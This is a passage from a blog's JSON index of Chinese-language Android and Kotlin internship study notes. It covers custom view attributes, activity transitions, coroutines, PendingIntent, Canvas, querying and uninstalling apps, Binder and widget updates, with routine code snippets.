最后，删除”修补bug分支”：1git branch -d fixbug-0.1 版本回退-撤销文件修改（针对文件修改的恢复） 参考 自定义组件之–自定义xml属性step1. 自定义属性名称 在values中创建一个xml文件，并且在其中写上你需要的自定义属性的名称以及类型。12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;resources&gt; &lt;declare-styleable name=&quot;MyTitle&quot;&gt; &lt;!--name 指向自定义组件的类名--&gt; &lt;attr name=&quot;textColor&quot; format=&quot;color&quot;/&gt; &lt;attr name=&quot;titleText&quot; format=&quot;string&quot;/&gt; &lt;attr name=&quot;leftText&quot; format=&quot;string&quot;/&gt; &lt;attr name=&quot;rightText&quot; format=&quot;string&quot;/&gt; &lt;/declare-styleable&gt;&lt;/resources&gt; step2. 将属性名称与控件关联1234567891011//从xml的属性中获取到字体颜色与stringTypedArray ta=context.obtainStyledAttributes(attrs,R.styleable.MyTitle);colorText=ta.getColor(R.styleable.MyTitle_textColor,Color.BLACK);textLeft=ta.getString(R.styleable.MyTitle_leftText);textTitle=ta.getString(R.styleable.MyTitle_titleText);textRight=ta.getString(R.styleable.MyTitle_rightText);ta.recycle();//public void recycle ()：//Give back a previously retrieved array, for later re-use.//回收 TypedArray,用于后续调用时可复用之。当调用该方法后，不能再操作该变量。//该类没有公共的构造函数，只提供静态方法获取实例，显然是一个典型的单例模式。这个 array 是从一个 array pool的池中获取的。 step3. 从第三方命名空间获取到自定义属性名称1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:my_view=&quot;http://schemas.android.com/apk/res-auto&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;!--添加这个 命名空间--&gt; &lt;com.example.double2.viewxmltest.MyView android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:background=&quot;@android:color/holo_blue_dark&quot; my_view:leftText=&quot;Back&quot; my_view:rightText=&quot;Go&quot; my_view:textColor=&quot;#fff&quot; my_view:titleText=&quot;MyViewTest&quot;/&gt; &lt;!--添加属性--&gt;&lt;/RelativeLayout&gt;","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8819%E6%97%A5/"},{"title":"实习笔记-6","text":"recyclerview 刷新数组越界问题属性动画 参考 recyclerview 点击位移","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8820%E6%97%A5/"},{"title":"实习笔记-7","text":"FragmentActivity和Activity的具体区别在哪里fragment是3.0以后的东西，为了在低版本中使用fragment就要用到android-support-v4.jar兼容包,fragmentActivity提供了操作fragment的一些方法，其功能跟3.0及以后的版本的Activity的功能一样。 1、fragmentactivity 继承自activity，用来解决android3.0 之前没有fragment的api，所以在使用的时候需要导入support包，同时继承fragmentActivity，这样在activity中就能嵌入fragment来实现你想要的布局效果。 2、当然3.0之后你就可以直接继承自Activity，并且在其中嵌入使用fragment了。 3、获得Manager的方式也不同 3.0以下：getSupportFragmentManager() 3.0以上：getFragmentManager()（已弃用） activity 转场动画 参考 使用windowAnimation和ActivityAnimation windowAnimation包含 windowEnterAnimation windowExitAnimation ActivityAnimation包含 android:activityOpenEnterAnimation android:activityOpenExitAnimation android:activityCloseEnterAnimation android:activityCloseExitAnimation 在项目中WindowAnimation的控制权大于Activity的控制权，即在Activity转场过程中，如果同时设置了WindowAnimation和ActivityAnimation,那么 可能（因为这种情况非常多） 只会执行WindowAnimation 对于WindowAnimation的定义很简单，在style.xml文件中只需要继承Animation.Style即可 overridePendingTransition 只能紧跟startActivity和finish之后调用 xml style在values/styles.xml下 1234567891011&lt;style name=&quot;AppTheme&quot; parent=&quot;Theme.AppCompat.DayNight.NoActionBar&quot;&gt; &lt;item name=&quot;android:windowAnimationStyle&quot;&gt;@style/myActivityOutEnterAnima&lt;/item&gt;&lt;/style&gt;&lt;style name=&quot;myActivityOutEnterAnima&quot; parent=&quot;@android:style/Animation.Activity&quot;&gt;&lt;!-- 定义activity的进出场动画 --&gt; &lt;item name=&quot;android:activityOpenEnterAnimation&quot;&gt;@anim/enter_from_right&lt;/item&gt; &lt;item name=&quot;android:activityOpenExitAnimation&quot;&gt;@anim/out_to_left&lt;/item&gt; &lt;item name=&quot;android:activityCloseEnterAnimation&quot;&gt;@anim/enter_from_left&lt;/item&gt; &lt;item name=&quot;android:activityCloseExitAnimation&quot;&gt;@anim/out_to_right&lt;/item&gt;&lt;/style&gt; 最后给Application/activity配置theme选项 5.0以后 内置Activity切换动画常用参数 enter：用于决定第一次打开当前Activity时的动画 exit : 用于决定退出当前Activity时的动画 reenter: 用于决定如果当前Activity已经打开过，并且再次打开该Activity时的动画 shared elements:用于决定在两个Activity之间切换时，指定两个Activity中对应的View的过渡效果 步骤1.在setContentView()之前执行，用于告诉Window页面切换需要使用动画接下来就是加载切换动画1getWindow().requestFeature(Window.FEATURE_CONTENT_TRANSITIONS); 2.加载切换动画123Transition explode = TransitionInflater .from(this) .inflateTransition(R.transition.explode); 3.告诉Window，当前的Activity在什么情况下使用上面的动画123getWindow().setExitTransition(explode);getWindow().setEnterTransition(explode);getWindow().setReenterTransition(explode); 或者在主题中添加 123&lt;item name=&quot;android:windowExitTransition&quot;&gt;@transition/explode&lt;/item&gt;&lt;item name=&quot;android:windowEnterTransition&quot;&gt;@transition/explode&lt;/item&gt;&lt;item name=&quot;android:windowReenterTransition&quot;&gt;@transition/explode&lt;/item&gt; 4.调用startActivity时，将Transition变成bundle1startActivity(intent, ActivityOptions.makeSceneTransitionAnimation(this).toBundle()); 使用内置动画在res/transition目录下，新建xml文件 123&lt;explode xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:duration=&quot;300&quot; /&gt; 123456&lt;slide xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:slideEdge=&quot;end&quot; android:duration=&quot;300&quot; /&gt; &lt;!--slideEdge表示起始滑动的侧边位置--&gt; &lt;!-- start, end top,bottom --&gt; 如果不希望状态栏，导航栏跟随一起执行动画，可以添加 target excludeId 123456789&lt;slide xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:slideEdge=&quot;end&quot; android:duration=&quot;300&quot;&gt; &lt;target android:excludeId=&quot;@android:id/navigationBarBackground&quot;/&gt; &lt;target android:excludeId=&quot;@android:id/statusBarBackground&quot;/&gt; &lt;/slide&gt; &lt;!--slideEdge表示起始滑动的侧边位置--&gt; &lt;!-- start, end top,bottom --&gt; 123&lt;fade xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:duration=&quot;300&quot; /&gt; sharedElement效果共享元素效果，与前面几种效果不同的是，共享元素效果是将前面一个Activity的某个子View与后面一个Activity的某个子View之间有过渡效果 1.将两个Activity中需要过渡的View加上Android:transitionName属性两个View的android:transitionName属性取值要一致 2.调用startActivity，makeTransitionAnimation时添加第二个参数–第一个Activity中的view对象，第三个参数–transitionName1startActivity(intent, ActivityOptions.makeSceneTransitionAnimation(this, SharedView, &quot;TransitionName&quot;).toBundle()) 添加多个view同时具有Transition过度切换效果把SharedView和TransitionName组成一个Pair，依次穿给makeSceneTransitionAnimation 123Pair first = new Pair&lt;&gt;(firstSharedView, ViewCompat.getTransitionName(firstSharedView));Pair second = new Pair&lt;&gt;(secondSharedView, ViewCompat.getTransitionName(secondSharedView));ActivityOptionsCompat.makeSceneTransitionAnimation(activity, first, second); 自定义过渡动画轨迹路径1.创建一个View的过渡移动的轨迹路径PathMotion类 我们可以创建ArcMotion对象，ArcMotion是PathMotion子类，是个曲线路径。想要了解更多ArcMotion可以查看： ArcMotion官方文档 2.定义ChangeBounds类我们自定义一个继承ChangeBounds的类，主要重写createAnimator函数，即创建你要执行的动画。这个函数由3个参数： ViewGroup sceneRoot：屏幕根View，即DecorView，第二个Activity的DecorView。 TransitionValues startValues ：属性动画的起始属性值，TransitionValues 对象内部有各Map类型的属性values，用于保存需要执行属性动画的属性。这个里面的属性值是在函数captureStartValues里放置，因此你可以重写captureStartValues函数，并把你自定义的属性动画中的属性放进去。 TransitionValues endValues：与startValues类似，表示属性动画结束时的属性值。可以通过重写captureEndValues函数，并把你自定义的属性动画里面的最终属性值放进去。 自动弹起软键盘1234567891011window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE)et.postDelayed({ runOnUiThread { et.isFocusable = true et.isFocusableInTouchMode = true et.requestFocus() et.findFocus() val inputManager = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager inputManager.showSoftInput(et, InputMethodManager.SHOW_IMPLICIT) }},300) 代码混淆application 初始化减少log 必须加debugviewbinding海外工作注意事项 海外app开发时不能连公司wifi，必须断网，或者用4g 不会的东西自己解决不了，大胆和同事请教和同事协调时间和进度。 心态上 别人指出问题，有自己判断，要客观","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8821%E6%97%A5/"},{"title":"实习笔记-8","text":"组件merge类名.()的写法123456789inline fun AppCompatActivity.fragmentTransaction(block: FragmentTransaction.() -&gt; Unit): Boolean { kotlin.runCatching { val t = supportFragmentManager.beginTransaction() block.invoke(t) t.commitNowAllowingStateLoss() return true } return false} 1234/* 新的协程job */fun newWorkerThreadCoroutineJob(block: suspend CoroutineScope.() -&gt; Unit): Job { return GlobalScope.launch(context = Dispatchers.IO, block = block)} android-job庫 參考 kotlin基礎kotlin 携程 顶层主协程? 协程是轻量级的线程 delay 是一个特殊的 挂起函数 ，它不会造成线程阻塞，但是会 挂起 协程，并且只能在协程中使用。12345678910import kotlinx.coroutines.*fun main() { GlobalScope.launch { // 在后台启动一个新的协程并继续 delay(1000L) // 非阻塞的等待 1 秒钟（默认时间单位是毫秒） println(&quot;World!&quot;) // 在延迟后打印输出 } println(&quot;Hello,&quot;) // 协程已在等待时主线程还在继续 Thread.sleep(2000L) // 阻塞主线程 2 秒钟来保证 JVM 存活} delay是非阻塞的，sleep是阻塞的 抛棄sleep，使用runBlocking與delay123456789101112import kotlinx.coroutines.*fun main() { GlobalScope.launch { // 在后台启动一个新的协程并继续 delay(1000L) println(&quot;World!&quot;) } println(&quot;Hello,&quot;) // 主线程中的代码会立即执行 runBlocking { // 但是这个表达式阻塞了主线程 delay(2000L) // ……我们延迟 2 秒来保证 JVM 的存活 } } 子協程的join方法123456val job = GlobalScope.launch { // 启动一个新协程并保持对这个作业的引用 delay(1000L) println(&quot;World!&quot;)}println(&quot;Hello,&quot;)job.join() // 等待直到子协程执行结束 suspend關鍵字object關鍵字能自動實現單例模式的class，不能被賦值123object Test { val a = 0;} 對應的字節碼 1234567891011121314151617public final class Test { private static final int a; @NotNull public static final Test INSTANCE; public final int getA() { return a; } private Test() { } static { Test var0 = new Test(); INSTANCE = var0; }} 伴生對象 在 JVM 平台，如果使用 @JvmStatic 注解，你可以将伴生对象的成员生成为真正的静态方法和字段。更详细信息请参见Java 互操作性一节 。 handler讓子綫程結束后的結果傳遞給主綫程， 給主綫程更新界面handler異步通信系統：Handler，message，Looper， MessageQueueLooper:主綫程不斷從消息隊列中拿消息的東西子綫程–拿到主綫程的handler，sendMessage–&gt;主綫程的Handler系統–從消息隊列中拿到消息，交給主綫程，handleMessage–&gt;主綫程","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8822%E6%97%A5/"},{"title":"实习笔记-9","text":"APP新手蒙层引导实现方式1SmartGuideView库 github 链接 教程 TourGuide库 github 使用Dialog自定义显示软键盘12345678910111213141516binding.etSearchSearchBar.postDelayed({ runOnUiThread { binding.etSearchSearchBar.apply { isFocusable = true isFocusableInTouchMode = true requestFocus() findFocus() } val inputManager = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager inputManager.showSoftInput( binding.etSearchSearchBar, InputMethodManager.SHOW_IMPLICIT ) }}, 300)","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8824%E6%97%A5/"},{"title":"实习笔记-10","text":"读取软件 声明权限123456789&lt;uses-permission android:name=&quot;android.permission.REQUEST_INSTALL_PACKAGES&quot; /&gt;&lt;!-- 对于安卓11开始 --&gt;&lt;uses-permission android:name=&quot;android.permission.QUERY_ALL_PACKAGES&quot; tools:ignore=&quot;QueryAllPackagesPermission&quot; /&gt;&lt;queries&gt; &lt;intent&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;/intent&gt;&lt;/queries&gt; 12345val pm = context.applicationContext.packageManagerval installedApplications = pm.getInstalledApplications(0)installedApplications.forEach {info -&gt; //handle info} 该操作比较耗时,在新线程或协程job中执行 获取应用Label(应用名) , 应用图标和应用安装时间123info.loadIcon(pm)pm.getApplicationLabel(info)pm.getPackageInfo(name, 0).firstInstallTime 卸载软件 发送intent 1234val intent = Intent(Intent.ACTION_DELETE)intent.data = Uri.parse(&quot;package:$packageName&quot;)intent.putExtra(Intent.EXTRA_RETURN_RESULT, true)mStartActivity.launch(intent) 注册StartActivityForResult 123456private val mStartActivity = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { val adapter = binding.rvSearchResult.adapter as AppsAdapter adapter.deletionResult(it != null &amp;&amp; it.resultCode == Activity.RESULT_OK) } ActivityResultContract12345678910111213//第一步，注册交互数据回调监听val contact = registerForActivityResult(ActivityResultContracts.PickContact()) { uri : Uri? -&gt; //如果Uri为null，说明用户没有操作直接返回，这里代码会在下面补贴出来，因为涉及跨进程交互，代码比较长，不想贴这里影响阅读效率 ……}//第二步，intent，和原来一样xxx.setOnClickListener { val intent = Intent(Intent.ACTION_PICK) intent.addCategory(Intent.CATEGORY_DEFAULT) intent.setType(&quot;vnd.android.cursor.dir/phone_v2&quot;) contact.launch(intent)}","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8825%E6%97%A5/"},{"title":"实习笔记-11","text":"Intent Action相关chooser可自定义标题，弹出软件选择器 123456789Intent intent = new Intent();intent.setAction(Intent.ACTION_SEND);intent.setType(&quot;text/plain&quot;);Intent intent2 = new Intent();intent2.setAction(Intent.ACTION_CHOOSER);intent2.putExtra(Intent.EXTRA_TITLE, &quot;please selete a app&quot;);//extra intentintent2.putExtra(Intent.EXTRA_INTENT, intent);startActivity(intent2); 方便起见，可以使用 1Intent.createChooser(Intent,CharSequence) ACTION_CONFIGURATION_CHANGED设备的设置改变，orientation，locale等 Configuration1Configuration config = getResources().getConfiguration(); requestedOrientation更改此Activity的所需方向。如果 Activity 当前处于前台或以其他方式影响屏幕方向，则屏幕将立即更改（可能导致 Activity 重新启动）。否则，这将在下次Activity可见时使用。 12345678landscape：限制界面为横屏，旋转屏幕也不会改变当前状态。portrait：限制界面为竖屏，旋转屏幕也不会改变当前状态。sensor:根据传感器定位方向，旋转手机90度，180,270,360，界面都会发生变化。sensorLandscape：（横屏的旋转，不会出现竖屏的现象）根据传感器定位方向，旋转手机180度界面旋转。一般横屏游戏会是这个属性。sensorPortrait：（竖屏的旋转，不会出现横屏的现象）根据传感器定位方向，旋转手机180度界面会旋转。unspecified：由系统选择显示方向，不同的设备可能会有所不同。（旋转手机，界面会跟着旋转）user:用户当前的首选方向。nosensor：不由传感器确定方向。旋转设备的时候，界面不会跟着旋转。初始界面方向由系统提供。 SystemClock12345678910111、public static long currentThreadTimeMillis () 返在当前线程运行的毫秒数。2、public static long elapsedRealtime () 返回系统启动到现在的毫秒数，包含休眠时间。3、public static long elapsedRealtimeNanos () 返回系统启动到现在的纳秒数，包含休眠时间。4、public static boolean setCurrentTimeMillis (long millis) 设置当前的&quot;墙&quot;时间，要求调用进程有许可权限。返回是否成功。5、public static void sleep (long ms) 等待给定的时间。和Thread.sleep(millis)类似，但是它不会抛出InterruptedException异常。事件被推迟到下一个中断操作。该方法直到指定的时间过去才返回。6、public static long uptimeMillis () 返回系统启动到现在的毫秒数，不包含休眠时间。就是说统计系统启动到现在的非休眠期时间。 Java 的强引用、弱引用、软引用、虚引用 1、强引用（StrongReference） 强引用是使用最普遍的引用。如果一个对象具有强引用，那垃圾回收器绝不会回收它。 当内存空间不足，Java虚拟机宁愿抛出OutOfMemoryError错误，使程序异常终止，也不会靠随意回收具有强引用的对象来解决内存不足的问题。 2、软引用（SoftReference） 如果一个对象只具有软引用，则内存空间足够，垃圾回收器就不会回收它；如果内存空间不足了，就会回收这些对象的内存。只要垃圾回收器没有回收它，该对象就可以被程序使用。软引用可用来实现内存敏感的高速缓存。 内存不足时才回收 3、弱引用（WeakReference） 弱引用与软引用的区别在于：只具有弱引用的对象拥有更短暂的生命周期。在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。不过，由于垃圾回收器是一个优先级很低的线程，因此不一定会很快发现那些只具有弱引用的对象。 只要被gc扫描到，无论是否缺内存都回收 4、虚引用（PhantomReference） “虚引用”顾名思义，就是形同虚设，与其他几种引用都不同，虚引用并不会决定对象的生命周期。如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收器回收。 虚引用主要用来跟踪对象被垃圾回收器回收的活动。虚引用与软引用和弱引用的一个区别在于：虚引用必须和引用队列 （ReferenceQueue）联合使用。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之 关联的引用队列中。","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8826%E6%97%A5/"},{"title":"实习笔记-12","text":"PendingIntent认识 PendIntent其实是Intent的封装 不是立刻执行某个行为，而是满足某些条件或触发某些事件后才执行指定的行为 我们的 Activity 如果设置了 exported = false，其他应用如果使用 Intent 就访问不到这个 Activity，但是使用 PendingIntent 是可以的。 即：PendingIntent将某个动作的触发时机交给其他应用；让那个应用代表自己去执行那个动作（权限都给他） 获取PendingIntent12345getActivity()getActivities()getBroadcast()getService()getForegroundService() 12345参数:Context - 上下文对象requestCode - 请求码Intent - 请求意图用以指明启动类及数据传递flags -关键标志位 flags FLAG_CANCEL_CURRENT 先将当前已有的PendingIntent取消，然后重新生成一个PendingIntent对象。 FLAG_NO_CREATE 如果当前系统中不存在相同的PendingIntent对象，系统将返回null，否则返回已有对象 FLAG_ONE_SHOT 该PendingIntent只作用一次。在该PendingIntent对象通过send()方法触发过后，PendingIntent将自动调用cancel()进行销毁，那么如果你再调用send()方法的话，系统将会返回一个SendIntentException。 FLAG_UPDATE_CURRENT 更新之前PendingIntent中的Intent对象数据，例如更新Intent中的Extras FLAG_IMMUTABLE 创建的PendingIntent是不可变的，使用send方法发送的附加Intent会被忽略 原理 A应用希望让B应用帮忙触发一个行为，这是跨应用的通信 需要 Android 系统作为中间人，这里的中间人就是 ActivityManager。 A应用创建建 PendingIntent，在创建 PendingIntent 的过程中，向 ActivityManager 注册了这个 PendingIntent，所以，即使A应用死了，当它再次苏醒时，只要提供相同的参数，还是可以获取到之前那个 PendingIntent 的。 当 A 将 PendingIntent 调用系统 API 比如 AlarmManager.set()，实际是将权限给了B应用，这时候， B应用可以根据参数信息，来从 ActivityManager 获取到 A 设置的 PendingIntent Canvas 相当于一个透明图层 每次调用canvas.drawXXXX系列函数来绘图，都会产生一个全新的Canvas画布。 如果在DrawXXX前，调用平移、旋转等函数来对Canvas进行了操作，那么这个操作是不可逆的！每次产生的画布最新位置都是这些操作后的位置。 在Canvas与屏幕合成时，超出屏幕范围的图像是不会显示出来的。 rotate函数 12345678910public class MyTextView extends TextView { public MyTextView(Context context, AttributeSet attrs) { super(context, attrs); } @Override protected void onDraw(Canvas canvas) { canvas.rotate(-90); super.onDraw(canvas); } } translate函数123void translate(float dx, float dy)// float dx：水平方向平移的距离，正数指向正方向（向右）平移的量，负数为向负方向（向左）平移的量// float dy: 垂直方向平移的距离，正数指向正方向 (向下) 平移量，负数为向负方向 (向上) 平移量 扭曲（skew）其实我觉得译成斜切更合适，在PS中的这个功能就差不多叫斜切。但这里还是直译吧，大家都是这个名字。看下它的构造函数： 123void skew (float sx, float sy)//float sx:将画布在x方向上倾斜相应的角度，sx倾斜角度的tan值//float sy:将画布在y轴方向上倾斜相应的角度，sy为倾斜角度的tan值 save restore每次save，将当前画布状态保存到一个状态栈中，restore从栈顶取出一个状态恢复到画布上 SDCard123456Environment.MEDIA_UNMOUNTED // 用户手工到手机设置中卸载sd卡之后的状态 Environment.MEDIA_REMOVED // 用户手动卸载，然后将sd卡从手机取出之后的状态 Environment.MEDIA_BAD_REMOVAL // 用户未到手机设置中手动卸载sd卡，直接拨出之后的状态 Environment.MEDIA_SHARED // 手机直接连接到电脑作为u盘使用之后的状态 Environment.MEDIA_CHECKINGS // 手机正在扫描sd卡过程中的状态 Environment.MEDIA_MOUNTED //挂载到挂载点上且有读写权限","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8827%E6%97%A5/"},{"title":"实习笔记-17","text":"协调问题 outsideLauncher 安卓中的单例模式 LayoutInflator也是一个SystemService SYSTEM_SERVICE_FETCHERS是一个hashMap，保存ServiceName-&gt;ServiceFetcher的单例 ServiceFetctor是一个接口，定义了 T getService(ContextImpl ctx); 安卓中的Builder模式 隔离getter，setter，在对象生成时对成员变量配置，生成后屏蔽 dialog","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%8811%E6%97%A5/"},{"title":"实习笔记-18","text":"协调问题 需要SceneEvent的Observer（√） 跳转问题（√）： battery错误跳转到boost，boost错误跳转到boost MainPageActivity在任务栈中时，点击通知按钮不跳转到功能页面，没有处理onNewIntent 在什么位置startService（√） startActivity的过程 如果intent指明了Component，直接通过component找到ActivityInfo，否则 如果Intent指定了组件所在包名，通过包名获取ActivityInfo，否则 通过ActivityIntentResolver等类的queryIntentForPackage进行模糊匹配，如Action，Category","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%8814%E6%97%A5/"},{"title":"实习笔记-19","text":"SlidingPaneLayoutwindowSizeClass – 屏幕布局决策ActivityEmbeddingNavigationRailBox With Constraints – 不同展示内容决策Custom Layout – 不同方式布局Scaffold","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%8815%E6%97%A5/"},{"title":"实习笔记-20","text":"App真正的入口ActivityThread 中的main方法，一个应用程序对应一个ActivityThread对象，Zygote孵化出一个进程后，就会执行main方法 准备Looper和消息队列 thread.attach()方法绑定到ActivityManagerService中 attach方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283private void attach(boolean system, long startSeq) { sCurrentActivityThread = this; mConfigurationController = new ConfigurationController(this); mSystemThread = system; if (!system) { android.ddm.DdmHandleAppName.setAppName(&quot;&lt;pre-initialized&gt;&quot;, UserHandle.myUserId()); RuntimeInit.setApplicationObject(mAppThread.asBinder()); final IActivityManager mgr = ActivityManager.getService(); try { mgr.attachApplication(mAppThread, startSeq); // } catch (RemoteException ex) { throw ex.rethrowFromSystemServer(); } // Watch for getting close to heap limit. BinderInternal.addGcWatcher(new Runnable() { @Override public void run() { if (!mSomeActivitiesChanged) { return; } Runtime runtime = Runtime.getRuntime(); long dalvikMax = runtime.maxMemory(); long dalvikUsed = runtime.totalMemory() - runtime.freeMemory(); if (dalvikUsed &gt; ((3*dalvikMax)/4)) { if (DEBUG_MEMORY_TRIM) Slog.d(TAG, &quot;Dalvik max=&quot; + (dalvikMax/1024) + &quot; total=&quot; + (runtime.totalMemory()/1024) + &quot; used=&quot; + (dalvikUsed/1024)); mSomeActivitiesChanged = false; try { ActivityTaskManager.getService().releaseSomeActivities(mAppThread); } catch (RemoteException e) { throw e.rethrowFromSystemServer(); } } } }); } else { // Don't set application object here -- if the system crashes, // we can't display an alert, we just want to die die die. android.ddm.DdmHandleAppName.setAppName(&quot;system_process&quot;, UserHandle.myUserId()); try { mInstrumentation = new Instrumentation(); mInstrumentation.basicInit(this); ContextImpl context = ContextImpl.createAppContext( this, getSystemContext().mPackageInfo); mInitialApplication = context.mPackageInfo.makeApplication(true, null); mInitialApplication.onCreate(); } catch (Exception e) { throw new RuntimeException( &quot;Unable to instantiate Application():&quot; + e.toString(), e); } } ViewRootImpl.ConfigChangedCallback configChangedCallback = (Configuration globalConfig) -&gt; { synchronized (mResourcesManager) { // TODO (b/135719017): Temporary log for debugging IME service. if (Build.IS_DEBUGGABLE &amp;&amp; mHasImeComponent) { Log.d(TAG, &quot;ViewRootImpl.ConfigChangedCallback for IME, &quot; + &quot;config=&quot; + globalConfig); } // We need to apply this change to the resources immediately, because upon returning // the view hierarchy will be informed about it. if (mResourcesManager.applyConfigurationToResources(globalConfig, null /* compat */, mInitialApplication.getResources().getDisplayAdjustments())) { mConfigurationController.updateLocaleListFromAppContext( mInitialApplication.getApplicationContext()); // This actually changed the resources! Tell everyone about it. final Configuration updatedConfig = mConfigurationController.updatePendingConfiguration(globalConfig); if (updatedConfig != null) { sendMessage(H.CONFIGURATION_CHANGED, globalConfig); mPendingConfiguration = updatedConfig; } } } }; ViewRootImpl.addConfigCallback(configChangedCallback);}","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%8816%E6%97%A5/"},{"title":"实习笔记-21","text":"协程取消问题可以自动取消的lifecycleScope","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%8817%E6%97%A5/"},{"title":"实习笔记-22","text":"LiveData, MutableLiveData防止暴露子类某些方法12val name: LiveData&lt;NameBean&gt; get() = _nameprivate val _name = MutableLiveData&lt;NameBean&gt;() 界面性能优化ViewStub根据条件判断某些控件显示，某些不显示时，可以使用ViewStub来减少不必要的实例化开销。 android.view.ViewStub，ViewStub 是一个轻量级的View，它一个看不见的，不占布局位置，占用资源非常小的控件。可以为ViewStub指定一个布局，在Inflate布局的时候，只有 ViewStub会被初始化，然后当ViewStub被设置为可见的时候，或是调用了ViewStub.inflate()的时候。 ViewStub的局限性 ViewStub只能Inflate一次，之后ViewStub对象会被置为空。按句话说，某个被ViewStub指定的布局被Inflate后，就不会够再通过ViewStub来控制它了。 ViewStub只能用来Inflate一个布局文件，而不是某个具体的View，当然也可以把View写在某个布局文件中。 基于以上的特点，那么可以考虑使用ViewStub的情况有： 在程序的运行期间，某个布局在Inflate后，就不会有变化，除非重新启动。 因为ViewStub只能Inflate一次，之后会被置空，所以无法指望后面接着使用ViewStub来控制布局。所以当需要在运行时不止一次的显示和隐藏某个布局，那么ViewStub是做不到的。这时就只能使用View的可见性来控制了。 想要控制显示与隐藏的是一个布局文件，而非某个View。 因为设置给ViewStub的只能是某个布局文件的Id，所以无法让它来控制某个View。 所以，如果想要控制某个View(如Button或TextView)的显示与隐藏，或者想要在运行时不断的显示与隐藏某个布局或View，只能使用View的可见性来控制。 startService","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%8818%E6%97%A5/"},{"title":"实习笔记-23","text":"MutableLiveData踩坑使用MutableLiveData的observer对数据进行观察，跳转界面返回后删除list中的元素，出现CurrentModificationException改用Vector等线程安全的集合 BinderBinder 与其他IPC的比较 binder 共享内存 Socket 拷贝一次 0 1 C/S模式，易用性高 控制负载，易用性差 C/S开销大 为每个App分配UID 访问接入点是开放的，不安全 访问接入点是开放的，不安全 共享内存 两个mmap，Binder一个mmap AIDLbindService到onConnection之间 asInterface会获得Proxy，调用代理对象的方法会调用mRemote.transact,传递调用的方法的编码，并挂起当前进程 能够启动服务所在进程和服务","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%8822%E6%97%A5/"},{"title":"实习笔记-13","text":"为什么用SurfaceView不用自定义组件 小组件在布局上的局限性 只支持原生控件，且不支持他们的后代 难以动态更新动画1234567891011121314151617FrameLayoutLinearLayoutRelativeLayoutGridLayoutAnalogClockButtonChronometerImageButtonImageViewProgressBarTextViewViewFlipperListViewGridViewStackViewAdapterViewFlipper 只能显示在某一屏 优化空间 壁纸的操作和部分launcher的操作冲突 只能在右侧，对左撇子不友好 两个wallpaper的drawFrame方法相似，可以进一步抽象","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%882%E6%97%A5/"},{"title":"实习笔记-14","text":"更新桌面小组件 Handler更新：只能坚持几秒钟 Service发送广播更新 Service的context从onReceive获取，一切正常。会存在保活的问题，至少30分钟系统才调用onUpdate一次 使用lateinit保存onUpdate的context，会报错lateinit property mContext has not been initialized onUpdate暴力递归 